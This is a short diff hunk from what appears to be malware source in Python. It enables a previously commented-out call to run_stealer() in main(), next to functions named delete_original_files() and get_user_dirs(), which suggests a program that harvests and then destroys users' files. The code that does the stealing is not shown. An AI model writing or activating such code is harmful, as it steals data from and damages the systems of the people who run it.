@@ -60,7 +60,7 @@ def delete_original_files():
 
 def main():
 
-    #run_stealer()
+    run_stealer()
 
     directories = get_user_dirs()
 
